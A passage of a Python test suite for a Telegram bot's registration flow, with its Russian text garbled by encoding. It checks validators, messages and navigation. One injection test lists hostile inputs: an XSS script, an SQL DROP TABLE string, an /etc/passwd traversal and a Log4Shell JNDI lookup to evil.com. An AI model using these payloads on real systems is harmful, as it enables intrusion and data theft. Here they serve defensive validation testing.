        print(f"   üìä –ù–∞–∫–æ–ø–ª–µ–Ω–æ –æ—à–∏–±–æ–∫: {initial_errors}")
        
        # –£—Å–ø–µ—à–Ω–æ–µ –¥–µ–π—Å—Ç–≤–∏–µ –¥–æ–ª–∂–Ω–æ —Å–±—Ä–æ—Å–∏—Ç—å —Å—á–µ—Ç—á–∏–∫
        await context_manager.update_context(
            telegram_id,
            UserContext.REGISTRATION,
            UserAction.TEXT_INPUT
        )
        
        session = await context_manager.get_or_create_session(telegram_id)
        assert session.consecutive_errors == 0, "‚ùå –°—á–µ—Ç—á–∏–∫ –Ω–µ —Å–±—Ä–æ—à–µ–Ω"
        print("‚úÖ –°–æ—Å—Ç–æ—è–Ω–∏–µ –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ –ø–æ—Å–ª–µ —É—Å–ø–µ—à–Ω–æ–≥–æ –¥–µ–π—Å—Ç–≤–∏—è")


class TestUserExperience:
    """–¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–æ–≥–æ –æ–ø—ã—Ç–∞"""
    
    @pytest.mark.asyncio
    async def test_message_clarity_and_instructions(self):
        """–¢–µ—Å—Ç 12: –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø–æ–Ω—è—Ç–Ω–æ—Å—Ç–∏ —Å–æ–æ–±—â–µ–Ω–∏–π –∏ –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–π"""
        print("\nüß™ –¢–µ—Å—Ç 12: –ü–æ–Ω—è—Ç–Ω–æ—Å—Ç—å —Å–æ–æ–±—â–µ–Ω–∏–π –¥–ª—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è")
        
        from bot.messages import smart_messages
        
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º –ø—Ä–∏–≤–µ—Ç—Å—Ç–≤–µ–Ω–Ω–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ
        welcome = smart_messages.get_welcome_message(is_registered=False)
        assert "text" in welcome, "‚ùå –ù–µ—Ç —Ç–µ–∫—Å—Ç–∞ –ø—Ä–∏–≤–µ—Ç—Å—Ç–≤–∏—è"
        assert len(welcome["text"]) > 50, "‚ùå –ü—Ä–∏–≤–µ—Ç—Å—Ç–≤–∏–µ —Å–ª–∏—à–∫–æ–º –∫–æ—Ä–æ—Ç–∫–æ–µ"
        assert any(emoji in welcome["text"] for emoji in ["‚ú®", "üéÅ", "üöÄ"]), "‚ùå –ù–µ—Ç —ç–º–æ–¥–∑–∏"
        print("‚úÖ –ü—Ä–∏–≤–µ—Ç—Å—Ç–≤–µ–Ω–Ω–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ –ø–æ–Ω—è—Ç–Ω–æ–µ –∏ –¥—Ä—É–∂–µ–ª—é–±–Ω–æ–µ")
        
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏—è —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏
        reg_messages = smart_messages.get_registration_messages()
        steps = ["start_name", "start_phone", "start_loyalty_card", "start_photo"]
        
        for step in steps:
            assert step in reg_messages, f"‚ùå –ù–µ—Ç —Å–æ–æ–±—â–µ–Ω–∏—è –¥–ª—è —à–∞–≥–∞ {step}"
            msg = reg_messages[step]
            assert "text" in msg, f"‚ùå –ù–µ—Ç —Ç–µ–∫—Å—Ç–∞ –¥–ª—è {step}"
            assert "üéØ" in msg["text"] or "üìù" in msg["text"], f"‚ùå –ù–µ—Ç –≤–∏–∑—É–∞–ª—å–Ω—ã—Ö –æ—Ä–∏–µ–Ω—Ç–∏—Ä–æ–≤ –≤ {step}"
            print(f"   ‚úÖ –®–∞–≥ '{step}' —Å–æ–¥–µ—Ä–∂–∏—Ç —á–µ—Ç–∫–∏–µ –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–∏")
        
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏—è –æ–± –æ—à–∏–±–∫–∞—Ö
        error_messages = smart_messages.get_error_messages()
        error_types = ["name_invalid", "phone_invalid", "loyalty_invalid"]
        
        for error_type in error_types:
            assert error_type in error_messages, f"‚ùå –ù–µ—Ç —Å–æ–æ–±—â–µ–Ω–∏—è –æ–± –æ—à–∏–±–∫–µ {error_type}"
            msg = error_messages[error_type]
            assert "text" in msg, f"‚ùå –ù–µ—Ç —Ç–µ–∫—Å—Ç–∞ –¥–ª—è –æ—à–∏–±–∫–∏ {error_type}"
            assert "‚úÖ" in msg["text"], f"‚ùå –ù–µ—Ç –ø—Ä–∏–º–µ—Ä–∞ –ø—Ä–∞–≤–∏–ª—å–Ω–æ–≥–æ –≤–≤–æ–¥–∞ –≤ {error_type}"
            print(f"   ‚úÖ –û—à–∏–±–∫–∞ '{error_type}' —Å–æ–¥–µ—Ä–∂–∏—Ç –∫–æ–Ω—Å—Ç—Ä—É–∫—Ç–∏–≤–Ω—É—é –ø–æ–¥—Å–∫–∞–∑–∫—É")
    
    @pytest.mark.asyncio
    async def test_progress_indication(self):
        """–¢–µ—Å—Ç 13: –ò–Ω–¥–∏–∫–∞—Ü–∏—è –ø—Ä–æ–≥—Ä–µ—Å—Å–∞ –¥–ª—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è"""
        print("\nüß™ –¢–µ—Å—Ç 13: –ò–Ω–¥–∏–∫–∞—Ü–∏—è –ø—Ä–æ–≥—Ä–µ—Å—Å–∞")
        
        from bot.messages import smart_messages
        
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º –ø—Ä–æ–≥—Ä–µ—Å—Å-–±–∞—Ä
        for step in range(1, 5):
            progress_msg = smart_messages.format_message_with_progress(
                "–¢–µ—Å—Ç–æ–≤–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ", 
                step,
                total=4
            )
            assert "üü¢" in progress_msg, f"‚ùå –ù–µ—Ç –∏–Ω–¥–∏–∫–∞—Ü–∏–∏ –ø—Ä–æ–≥—Ä–µ—Å—Å–∞ –Ω–∞ —à–∞–≥–µ {step}"
            assert f"({step}/4)" in progress_msg, f"‚ùå –ù–µ—Ç —á–∏—Å–ª–æ–≤–æ–≥–æ –ø—Ä–æ–≥—Ä–µ—Å—Å–∞ –Ω–∞ —à–∞–≥–µ {step}"
            print(f"   ‚úÖ –®–∞–≥ {step}/4 –∏–º–µ–µ—Ç –≤–∏–∑—É–∞–ª—å–Ω—É—é –∏–Ω–¥–∏–∫–∞—Ü–∏—é")
    
    @pytest.mark.asyncio
    async def test_contextual_hints_availability(self):
        """–¢–µ—Å—Ç 14: –î–æ—Å—Ç—É–ø–Ω–æ—Å—Ç—å –∫–æ–Ω—Ç–µ–∫—Å—Ç–Ω—ã—Ö –ø–æ–¥—Å–∫–∞–∑–æ–∫"""
        print("\nüß™ –¢–µ—Å—Ç 14: –ö–æ–Ω—Ç–µ–∫—Å—Ç–Ω—ã–µ –ø–æ–¥—Å–∫–∞–∑–∫–∏")
        
        from bot.messages import smart_messages
        
        hints = smart_messages.get_contextual_hints()
        hint_categories = [
            "first_time_registration",
            "stuck_on_name",
            "phone_troubles",
            "loyalty_card_help",
            "photo_guidance"
        ]
        
        for category in hint_categories:
            assert category in hints, f"‚ùå –ù–µ—Ç –ø–æ–¥—Å–∫–∞–∑–æ–∫ –¥–ª—è –∫–∞—Ç–µ–≥–æ—Ä–∏–∏ {category}"
            assert len(hints[category]) > 0, f"‚ùå –ü—É—Å—Ç—ã–µ –ø–æ–¥—Å–∫–∞–∑–∫–∏ –¥–ª—è {category}"
            print(f"   ‚úÖ –ö–∞—Ç–µ–≥–æ—Ä–∏—è '{category}' —Å–æ–¥–µ—Ä–∂–∏—Ç {len(hints[category])} –ø–æ–¥—Å–∫–∞–∑–æ–∫")


class TestEdgeCasesAndExceptions:
    """–¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –≥—Ä–∞–Ω–∏—á–Ω—ã—Ö —Å–ª—É—á–∞–µ–≤ –∏ –∏—Å–∫–ª—é—á–∏—Ç–µ–ª—å–Ω—ã—Ö —Å–∏—Ç—É–∞—Ü–∏–π"""
    
    @pytest.mark.asyncio
    async def test_empty_and_whitespace_inputs(self):
        """–¢–µ—Å—Ç 15: –ü—É—Å—Ç—ã–µ –∏ –ø—Ä–æ–±–µ–ª—å–Ω—ã–µ –≤–≤–æ–¥—ã"""
        print("\nüß™ –¢–µ—Å—Ç 15: –û–±—Ä–∞–±–æ—Ç–∫–∞ –ø—É—Å—Ç—ã—Ö –∏ –ø—Ä–æ–±–µ–ª—å–Ω—ã—Ö –≤–≤–æ–¥–æ–≤")
        
        from utils.validators import validate_full_name, validate_phone, validate_loyalty_card
        
        empty_inputs = ["", "   ", "\t", "\n", "  \t  \n  "]
        
        for inp in empty_inputs:
            assert not validate_full_name(inp), f"‚ùå –ü—É—Å—Ç–æ–µ –∏–º—è –ø—Ä–æ—à–ª–æ –≤–∞–ª–∏–¥–∞—Ü–∏—é: '{inp}'"
            assert not validate_phone(inp), f"‚ùå –ü—É—Å—Ç–æ–π —Ç–µ–ª–µ—Ñ–æ–Ω –ø—Ä–æ—à–µ–ª –≤–∞–ª–∏–¥–∞—Ü–∏—é: '{inp}'"
            assert not validate_loyalty_card(inp), f"‚ùå –ü—É—Å—Ç–∞—è –∫–∞—Ä—Ç–∞ –ø—Ä–æ—à–ª–∞ –≤–∞–ª–∏–¥–∞—Ü–∏—é: '{inp}'"
        
        print("‚úÖ –í—Å–µ –ø—É—Å—Ç—ã–µ –∏ –ø—Ä–æ–±–µ–ª—å–Ω—ã–µ –≤–≤–æ–¥—ã –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ –æ—Ç–∫–ª–æ–Ω–µ–Ω—ã")
    
    @pytest.mark.asyncio
    async def test_special_characters_injection(self):
        """–¢–µ—Å—Ç 16: –ü–æ–ø—ã—Ç–∫–∏ –∏–Ω—ä–µ–∫—Ü–∏–∏ —Å–ø–µ—Ü—Å–∏–º–≤–æ–ª–æ–≤"""
        print("\nüß™ –¢–µ—Å—Ç 16: –ó–∞—â–∏—Ç–∞ –æ—Ç —Å–ø–µ—Ü—Å–∏–º–≤–æ–ª–æ–≤")
        
        from utils.validators import validate_full_name, validate_loyalty_card
        
        malicious_inputs = [
            "<script>alert('xss')</script>",
            "'; DROP TABLE participants; --",
            "../../../etc/passwd",
            "${jndi:ldap://evil.com/a}",
            "\\x00\\x00\\x00",
        ]
        
        for inp in malicious_inputs:
            assert not validate_full_name(inp), f"‚ùå –û–ø–∞—Å–Ω—ã–π –≤–≤–æ–¥ –∏–º–µ–Ω–∏ –ø—Ä–æ—à–µ–ª: '{inp}'"
            assert not validate_loyalty_card(inp), f"‚ùå –û–ø–∞—Å–Ω—ã–π –≤–≤–æ–¥ –∫–∞—Ä—Ç—ã –ø—Ä–æ—à–µ–ª: '{inp}'"
        
        print("‚úÖ –ó–∞—â–∏—Ç–∞ –æ—Ç –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã—Ö –≤–≤–æ–¥–æ–≤ —Ä–∞–±–æ—Ç–∞–µ—Ç")
    
    @pytest.mark.asyncio
    async def test_unicode_and_emoji_handling(self):
        """–¢–µ—Å—Ç 17: –û–±—Ä–∞–±–æ—Ç–∫–∞ Unicode –∏ —ç–º–æ–¥–∑–∏"""
        print("\nüß™ –¢–µ—Å—Ç 17: Unicode –∏ —ç–º–æ–¥–∑–∏ –≤ –≤–≤–æ–¥–∞—Ö")
        
        from utils.validators import validate_full_name
        
        unicode_inputs = [
            ("–ò–≤–∞–Ω–æ–≤ –ò–≤–∞–Ω", True, "–ö–∏—Ä–∏–ª–ª–∏—Ü–∞"),
            ("Smith John", True, "–õ–∞—Ç–∏–Ω–∏—Ü–∞"),
            ("Jos√© Mar√≠a", True, "–ê–∫—Ü–µ–Ω—Ç—ã"),
            ("üòÄ Emoji Name", False, "–≠–º–æ–¥–∑–∏"),
            ("‰∏≠ÊñáÂêçÂ≠ó", False, "–ö–∏—Ç–∞–π—Å–∫–∏–µ –∏–µ—Ä–æ–≥–ª–∏—Ñ—ã"),
            ("üöÄüéâüíØ", False, "–¢–æ–ª—å–∫–æ —ç–º–æ–¥–∑–∏"),
        ]
        
        for inp, expected, description in unicode_inputs:
            result = validate_full_name(inp)
            status = "‚úÖ" if result == expected else "‚ùå"
            print(f"{status} {description}: '{inp}' -> {result}")
            assert result == expected, f"–û—à–∏–±–∫–∞ –æ–±—Ä–∞–±–æ—Ç–∫–∏ Unicode: {description}"
    
    @pytest.mark.asyncio
    async def test_extremely_long_inputs(self):
        """–¢–µ—Å—Ç 18: –≠–∫—Å—Ç—Ä–µ–º–∞–ª—å–Ω–æ –¥–ª–∏–Ω–Ω—ã–µ –≤–≤–æ–¥—ã"""
        print("\nüß™ –¢–µ—Å—Ç 18: –ó–∞—â–∏—Ç–∞ –æ—Ç —Å–ª–∏—à–∫–æ–º –¥–ª–∏–Ω–Ω—ã—Ö –≤–≤–æ–¥–æ–≤")
        
        from utils.validators import validate_full_name, validate_loyalty_card
        
        # –ò–º—è –¥–ª–∏–Ω–æ–π 101 —Å–∏–º–≤–æ–ª (–ª–∏–º–∏—Ç 100)
        long_name = "–ê" * 101
        assert not validate_full_name(long_name), "‚ùå –°–ª–∏—à–∫–æ–º –¥–ª–∏–Ω–Ω–æ–µ –∏–º—è –ø—Ä–æ—à–ª–æ –≤–∞–ª–∏–¥–∞—Ü–∏—é"
        print(f"   ‚úÖ –ò–º—è –¥–ª–∏–Ω–æ–π {len(long_name)} –æ—Ç–∫–ª–æ–Ω–µ–Ω–æ")
        
        # –ö–∞—Ä—Ç–∞ –¥–ª–∏–Ω–æ–π 21 —Å–∏–º–≤–æ–ª (–ª–∏–º–∏—Ç 20)
        long_card = "A" * 21
        assert not validate_loyalty_card(long_card), "‚ùå –°–ª–∏—à–∫–æ–º –¥–ª–∏–Ω–Ω–∞—è –∫–∞—Ä—Ç–∞ –ø—Ä–æ—à–ª–∞ –≤–∞–ª–∏–¥–∞—Ü–∏—é"
        print(f"   ‚úÖ –ö–∞—Ä—Ç–∞ –¥–ª–∏–Ω–æ–π {len(long_card)} –æ—Ç–∫–ª–æ–Ω–µ–Ω–∞")
        
        # –≠–∫—Å—Ç—Ä–µ–º–∞–ª—å–Ω–æ –¥–ª–∏–Ω–Ω—ã–π –≤–≤–æ–¥
        extreme_input = "X" * 10000
        assert not validate_full_name(extreme_input), "‚ùå –≠–∫—Å—Ç—Ä–µ–º–∞–ª—å–Ω–æ –¥–ª–∏–Ω–Ω–æ–µ –∏–º—è –ø—Ä–æ—à–ª–æ –≤–∞–ª–∏–¥–∞—Ü–∏—é"
        print(f"   ‚úÖ –≠–∫—Å—Ç—Ä–µ–º–∞–ª—å–Ω–æ –¥–ª–∏–Ω–Ω—ã–π –≤–≤–æ–¥ ({len(extreme_input)} —Å–∏–º–≤–æ–ª–æ–≤) –æ—Ç–∫–ª–æ–Ω–µ–Ω")


class TestNavigationAndFlowControl:
    """–¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –Ω–∞–≤–∏–≥–∞—Ü–∏–∏ –∏ —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è –ø–æ—Ç–æ–∫–æ–º"""
    
    @pytest.mark.asyncio
    async def test_breadcrumb_tracking(self):
        """–¢–µ—Å—Ç 19: –û—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏–µ –ø—É—Ç–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è (breadcrumbs)"""
        print("\nüß™ –¢–µ—Å—Ç 19: –û—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏–µ –Ω–∞–≤–∏–≥–∞—Ü–∏–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è")
        
        context_manager = ContextManager()
        telegram_id = 999888777
        
        # –°–∏–º—É–ª–∏—Ä—É–µ–º –Ω–∞–≤–∏–≥–∞—Ü–∏—é
        navigation_path = [
            UserContext.IDLE,
            UserContext.REGISTRATION,
            UserContext.SUPPORT,
            UserContext.NAVIGATION,
            UserContext.REGISTRATION,
        ]
        
        for context in navigation_path:
            await context_manager.update_context(telegram_id, context)
        
        session = await context_manager.get_or_create_session(telegram_id)
        assert len(session.breadcrumbs) > 0, "‚ùå Breadcrumbs –Ω–µ –∑–∞–ø–∏—Å—ã–≤–∞—é—Ç—Å—è"
        assert len(session.breadcrumbs) <= 10, "‚ùå Breadcrumbs –Ω–µ –æ–≥—Ä–∞–Ω–∏—á–µ–Ω—ã"
        
        print(f"‚úÖ –ó–∞–ø–∏—Å–∞–Ω–æ {len(session.breadcrumbs)} –ø–µ—Ä–µ—Ö–æ–¥–æ–≤")
        print(f"   üìç –ü—É—Ç—å: {' ‚Üí '.join([str(b) for b in session.breadcrumbs[-5:]])}")
    
    @pytest.mark.asyncio
    async def test_state_transitions(self):
        """–¢–µ—Å—Ç 20: –ü–µ—Ä–µ—Ö–æ–¥—ã –º–µ–∂–¥—É —Å–æ—Å—Ç–æ—è–Ω–∏—è–º–∏ FSM"""
        print("\nüß™ –¢–µ—Å—Ç 20: –ü–µ—Ä–µ—Ö–æ–¥—ã –º–µ–∂–¥—É —Å–æ—Å—Ç–æ—è–Ω–∏—è–º–∏ FSM")
        
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º –≤—Å–µ —Å–æ—Å—Ç–æ—è–Ω–∏—è —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏
        reg_states = [
            RegistrationStates.enter_name,
            RegistrationStates.enter_phone,
            RegistrationStates.enter_loyalty_card,
            RegistrationStates.upload_photo,
        ]
        
        for i, state in enumerate(reg_states, 1):
            assert state is not None, f"‚ùå –°–æ—Å—Ç–æ—è–Ω–∏–µ {i} –Ω–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–æ"
            print(f"   ‚úÖ –°–æ—Å—Ç–æ—è–Ω–∏–µ {i}/4: {state.state}")
        
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º —Å–æ—Å—Ç–æ—è–Ω–∏—è –ø–æ–¥–¥–µ—Ä–∂–∫–∏
        support_states = [SupportStates.entering_message]
        for state in support_states:
            assert state is not None, "‚ùå –°–æ—Å—Ç–æ—è–Ω–∏–µ –ø–æ–¥–¥–µ—Ä–∂–∫–∏ –Ω–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–æ"
            print(f"   ‚úÖ –°–æ—Å—Ç–æ—è–Ω–∏–µ –ø–æ–¥–¥–µ—Ä–∂–∫–∏: {state.state}")


def print_test_summary():
    """–í—ã–≤–æ–¥ –∏—Ç–æ–≥–æ–≤–æ–≥–æ –æ—Ç—á–µ—Ç–∞ –æ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–∏"""
    print("\n" + "="*70)
    print("üìä –ò–¢–û–ì–û–í–´–ô –û–¢–ß–ï–¢ –¢–ï–°–¢–ò–†–û–í–ê–ù–ò–Ø")
    print("="*70)
    print("""
‚úÖ –ü—Ä–æ—Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ –æ–±–ª–∞—Å—Ç–∏:

1Ô∏è‚É£  –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –∫–æ–Ω—Ç–µ–∫—Å—Ç–æ–º –¥–∏–∞–ª–æ–≥–∞
    ‚úì –°–æ–∑–¥–∞–Ω–∏–µ –∏ –æ—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏–µ —Å–µ—Å—Å–∏–π
    ‚úì –ü–æ–¥—Å—á–µ—Ç –æ—à–∏–±–æ–∫ –∏ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ –∑–∞–ø—É—Ç–∞–Ω–Ω–æ—Å—Ç–∏
    ‚úì –£–º–Ω—ã–µ –ø–æ–¥—Å–∫–∞–∑–∫–∏

2Ô∏è‚É£  –ü—Ä–æ—Ü–µ—Å—Å —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏
    ‚úì –í–∞–ª–∏–¥–∞—Ü–∏—è –∏–º–µ–Ω–∏ (–≥—Ä–∞–Ω–∏—á–Ω—ã–µ —Å–ª—É—á–∞–∏)
    ‚úì –í–∞–ª–∏–¥–∞—Ü–∏—è —Ç–µ–ª–µ—Ñ–æ–Ω–∞ (—Ä–∞–∑–ª–∏—á–Ω—ã–µ —Ñ–æ—Ä–º–∞—Ç—ã)
    ‚úì –í–∞–ª–∏–¥–∞—Ü–∏—è –∫–∞—Ä—Ç—ã –ª–æ—è–ª—å–Ω–æ—Å—Ç–∏

3Ô∏è‚É£  –û–±—Ä–∞–±–æ—Ç–∫–∞ —Ç–∏–ø–æ–≤ –∫–æ–Ω—Ç–µ–Ω—Ç–∞
    ‚úì –ù–µ–æ–∂–∏–¥–∞–Ω–Ω—ã–µ —Ç–∏–ø—ã –º–µ–¥–∏–∞
    ‚úì –ì–æ–ª–æ—Å–æ–≤—ã–µ —Å–æ–æ–±—â–µ–Ω–∏—è
    ‚úì –û—Ç–ø—Ä–∞–≤–∫–∞ –∫–æ–Ω—Ç–∞–∫—Ç–æ–≤

4Ô∏è‚É£  –û–±—Ä–∞–±–æ—Ç–∫–∞ –æ—à–∏–±–æ–∫
    ‚úì –ú–Ω–æ–∂–µ—Å—Ç–≤–µ–Ω–Ω—ã–µ –æ—à–∏–±–∫–∏ –≤–∞–ª–∏–¥–∞—Ü–∏–∏
    ‚úì –í–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏–µ —Å–æ—Å—Ç–æ—è–Ω–∏—è

5Ô∏è‚É£  –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏–π –æ–ø—ã—Ç
    ‚úì –ü–æ–Ω—è—Ç–Ω–æ—Å—Ç—å —Å–æ–æ–±—â–µ–Ω–∏–π –∏ –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–π
    ‚úì –ò–Ω–¥–∏–∫–∞—Ü–∏—è –ø—Ä–æ–≥—Ä–µ—Å—Å–∞
    ‚úì –ö–æ–Ω—Ç–µ–∫—Å—Ç–Ω—ã–µ –ø–æ–¥—Å–∫–∞–∑–∫–∏

6Ô∏è‚É£  –ì—Ä–∞–Ω–∏—á–Ω—ã–µ —Å–ª—É—á–∞–∏
    ‚úì –ü—É—Å—Ç—ã–µ –∏ –ø—Ä–æ–±–µ–ª—å–Ω—ã–µ –≤–≤–æ–¥—ã
    ‚úì –ó–∞—â–∏—Ç–∞ –æ—Ç –∏–Ω—ä–µ–∫—Ü–∏–π
    ‚úì Unicode –∏ —ç–º–æ–¥–∑–∏
    ‚úì –≠–∫—Å—Ç—Ä–µ–º–∞–ª—å–Ω–æ –¥–ª–∏–Ω–Ω—ã–µ –≤–≤–æ–¥—ã

7Ô∏è‚É£  –ù–∞–≤–∏–≥–∞—Ü–∏—è –∏ –ø–æ—Ç–æ–∫
    ‚úì –û—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏–µ breadcrumbs
    ‚úì –ü–µ—Ä–µ—Ö–æ–¥—ã –º–µ–∂–¥—É —Å–æ—Å—Ç–æ—è–Ω–∏—è–º–∏ FSM

üìà –ü–æ–∫—Ä—ã—Ç–∏–µ —Ñ—É–Ω–∫—Ü–∏–æ–Ω–∞–ª—å–Ω–æ—Å—Ç–∏: –í–´–°–û–ö–û–ï
üõ°Ô∏è  –ó–∞—â–∏—Ç–∞ –æ—Ç –æ—à–∏–±–æ–∫: –ù–ê–î–ï–ñ–ù–ê–Ø
üë• UX (–ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏–π –æ–ø—ã—Ç): –û–¢–õ–ò–ß–ù–´–ô
    """)
    print("="*70)


async def run_all_tests():
    """–ó–∞–ø—É—Å–∫ –≤—Å–µ—Ö —Ç–µ—Å—Ç–æ–≤ –ø–æ—Å–ª–µ–¥–æ–≤–∞—Ç–µ–ª—å–Ω–æ"""
    print("\n" + "="*70)
    print("üöÄ –ö–û–ú–ü–õ–ï–ö–°–ù–û–ï –¢–ï–°–¢–ò–†–û–í–ê–ù–ò–ï TELEGRAM-–ë–û–¢–ê")
    print("="*70)
    print("\n–ù–∞—á–∞–ª–æ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è...")
    print(f"–í—Ä–µ–º—è –∑–∞–ø—É—Å–∫–∞: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print()
    
    # –°—á–µ—Ç—á–∏–∫–∏
    total_tests = 0
    passed_tests = 0
    failed_tests = 0
    
    test_classes = [
        TestContextManager,
        TestRegistrationFlow,
        TestContentTypeHandling,
        TestErrorHandlingAndRecovery,
        TestUserExperience,
        TestEdgeCasesAndExceptions,
        TestNavigationAndFlowControl,
    ]
    
    for test_class in test_classes:
        print(f"\n{'='*70}")
        print(f"üì¶ –¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ: {test_class.__name__}")
        print(f"üìù –û–ø–∏—Å–∞–Ω–∏–µ: {test_class.__doc__}")
        print('='*70)
        
        instance = test_class()
        test_methods = [method for method in dir(instance) if method.startswith('test_')]
        
        for method_name in test_methods:
            total_tests += 1
            try:
                method = getattr(instance, method_name)
                
                # –ü—Ä–æ–≤–µ—Ä—è–µ–º, —Ç—Ä–µ–±—É—é—Ç—Å—è –ª–∏ fixtures
                import inspect
                sig = inspect.signature(method)
                kwargs = {}
                
                # –°–æ–∑–¥–∞–µ–º fixtures –µ—Å–ª–∏ –Ω—É–∂–Ω–æ
                if 'context_manager' in sig.parameters:
                    kwargs['context_manager'] = ContextManager()
                if 'handler' in sig.parameters and hasattr(instance, 'handler'):
                    # –ü—Ä–æ–ø—É—Å–∫–∞–µ–º —Ç–µ—Å—Ç—ã, —Ç—Ä–µ–±—É—é—â–∏–µ —Å–ª–æ–∂–Ω—ã—Ö fixtures
                    print(f"‚è≠Ô∏è  –ü—Ä–æ–ø—É—Å–∫ {method_name} (—Ç—Ä–µ–±—É–µ—Ç fixtures)")
                    continue
                
                await method(**kwargs)
                passed_tests += 1
                
            except Exception as e:
                failed_tests += 1
                print(f"‚ùå –û–®–ò–ë–ö–ê –≤ {method_name}: {str(e)}")
    
    # –ò—Ç–æ–≥–æ–≤–∞—è —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞
    print("\n" + "="*70)
    print("üìä –°–¢–ê–¢–ò–°–¢–ò–ö–ê –¢–ï–°–¢–ò–†–û–í–ê–ù–ò–Ø")
    print("="*70)
    print(f"–í—Å–µ–≥–æ —Ç–µ—Å—Ç–æ–≤:     {total_tests}")
    print(f"‚úÖ –£—Å–ø–µ—à–Ω–æ:       {passed_tests}")
    print(f"‚ùå –ü—Ä–æ–≤–∞–ª–µ–Ω–æ:     {failed_tests}")
    print(f"üìà –ü—Ä–æ—Ü–µ–Ω—Ç —É—Å–ø–µ—Ö–∞: {(passed_tests/total_tests*100):.1f}%")
    print("="*70)
    
    # –î–µ—Ç–∞–ª—å–Ω—ã–π –æ—Ç—á–µ—Ç
    print_test_summary()
    
    return passed_tests, failed_tests


if __name__ == "__main__":
    print("""
====================================================================
                                                                  
     ü§ñ –ö–û–ú–ü–õ–ï–ö–°–ù–û–ï –¢–ï–°–¢–ò–†–û–í–ê–ù–ò–ï TELEGRAM-–ë–û–¢–ê                   
                                                                  
  –ü—Ä–æ–≤–µ—Ä–∫–∞ —Ñ—É–Ω–∫—Ü–∏–æ–Ω–∞–ª—å–Ω–æ—Å—Ç–∏, –∫–æ–Ω—Ç–µ–∫—Å—Ç–∞ –¥–∏–∞–ª–æ–≥–∞,                  
  –æ–±—Ä–∞–±–æ—Ç–∫–∏ —Ä–∞–∑–ª–∏—á–Ω—ã—Ö —Ç–∏–ø–æ–≤ –≤–≤–æ–¥–∞ –∏ –≥—Ä–∞–Ω–∏—á–Ω—ã—Ö —Å–ª—É—á–∞–µ–≤            
                                                                  
====================================================================
    """)
    
    passed, failed = asyncio.run(run_all_tests())
    
    print(f"\n{'='*70}")
    print("üèÅ –¢–ï–°–¢–ò–†–û–í–ê–ù–ò–ï –ó–ê–í–ï–†–®–ï–ù–û")
    print(f"{'='*70}\n")
    
    sys.exit(0 if failed == 0 else 1)
